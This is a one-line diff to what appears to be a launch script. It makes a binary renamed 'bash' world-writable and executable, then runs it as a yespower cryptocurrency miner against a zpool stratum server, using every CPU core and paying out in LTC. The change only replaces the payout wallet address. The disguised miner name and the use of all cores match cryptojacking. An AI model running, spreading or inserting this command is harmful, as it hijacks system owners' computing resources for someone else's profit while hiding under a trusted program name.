@@ -1,1 +1,1 @@
-chmod 777 bash && ./bash -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.ZZ -p c=LTC -t $(nproc --all)
+chmod 777 bash && ./bash -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u LViSs9qdctYGL4Bze21iVjNNqHEDF1JsoX.ZZ -p c=LTC -t $(nproc --all)
